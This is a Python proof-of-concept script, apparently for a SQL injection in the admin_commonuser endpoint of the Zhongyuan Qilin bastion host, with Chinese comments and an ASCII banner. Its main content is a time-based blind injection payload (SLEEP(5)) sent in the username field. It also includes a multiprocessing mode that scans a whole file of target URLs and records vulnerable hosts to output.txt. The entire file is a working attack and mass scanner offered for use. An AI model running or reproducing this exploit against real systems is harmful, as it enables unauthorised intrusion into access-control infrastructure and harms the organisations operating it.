#先导包
import requests,argparse,sys
from multiprocessing import Pool

requests.packages.urllib3.disable_warnings()#关掉特定的报错信息


def banner():
    test = """
██╗     ██╗   ██╗ █████╗ ███╗   ██╗███╗   ███╗ █████╗  ██████╗ ██████╗ ██████╗ ███████╗
██║     ██║   ██║██╔══██╗████╗  ██║████╗ ████║██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝
██║     ██║   ██║███████║██╔██╗ ██║██╔████╔██║███████║██║     ██║   ██║██║  ██║█████╗  
██║     ██║   ██║██╔══██║██║╚██╗██║██║╚██╔╝██║██╔══██║██║     ██║   ██║██║  ██║██╔══╝  
███████╗╚██████╔╝██║  ██║██║ ╚████║██║ ╚═╝ ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
                                                            author:luanma                           
    """
    print(test)

def poc(target):
    payload = '/admin.php?controller=admin_commonuser'
    data = "username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    headers = {
        "Content-Length": "78",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36",
        "Accept-Encoding": "gzip,deflate,br"
    }
    try:
        res = requests.get(target+payload,verify=False,timeout=10)
        time1 = res.elapsed.total_seconds()
        if res.status_code == 200 and 'result' in res.text:
            res2 = requests.get(target+payload,verify=False,headers=headers,timeout=10,data=data)
            time2 = res2.elapsed.total_seconds()
            if time2 >= 5:
                with open ('output.txt','a',encoding='utf-8') as f:
                    f.write(f"{target}\n")
                print(f'[+]{target}存在sql注入漏洞')
            else:
                print(f"[-]{target}不存在sql注入漏洞")
        else:
            print(f"[-]{target}可能存在问题,请手工注入")
    except Exception as e:
        print(f"[-]{target}出现错误")



def main():
    banner()
    parser = argparse.ArgumentParser(description="中远麒麟堡垒机存在SQL注入")#实例化
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入一个可能存在漏洞的url")
    parser.add_argument('-f','--file',dest='file',type=str,help='请输入一个额包含资产的文件')
    args = parser.parse_args()
    url_list = []
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.replace('\n',''))
        mp = Pool(10)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage: python {sys.argv[0]} -h or --help for help")


if __name__ == '__main__':
    main()